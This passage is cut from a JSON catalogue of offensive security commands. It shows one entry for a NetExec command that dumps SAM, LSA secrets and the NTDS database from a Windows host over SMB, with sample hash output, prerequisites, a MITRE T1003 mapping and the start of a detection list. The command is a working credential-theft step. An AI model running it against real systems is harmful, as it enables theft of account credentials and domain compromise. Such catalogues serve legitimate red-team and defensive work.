    "category": "post_exploitation",
    "phase": 6,
    "os": [
      "linux"
    ],
    "command": "netexec smb <target> -u admin -p pass --sam --lsa --ntds",
    "name": "NetExec Credential Dump",
    "description": "Dumps SAM, LSA secrets, and NTDS from target \u2014 all credentials at once.",
    "arguments": {
      "--sam": "Dump SAM",
      "--lsa": "Dump LSA secrets",
      "--ntds": "Dump NTDS (DC only)"
    },
    "expected_output": "SAM:\nAdministrator:500:aad3b435...:fc525c96...\n\nLSA:\nDPAPI_SYSTEM: ...\n\nNTDS:\nkrbtgt:502:...",
    "use_case": "One-command credential dump \u2014 SAM for local, LSA for service accounts, NTDS for entire domain.",
    "prerequisites": [
      "Admin credentials",
      "SMB access"
    ],
    "mitre_mapping": [
      "T1003"
    ],
    "mitre_tactic": "Credential Access",
    "detections": [
      "LSASS access",
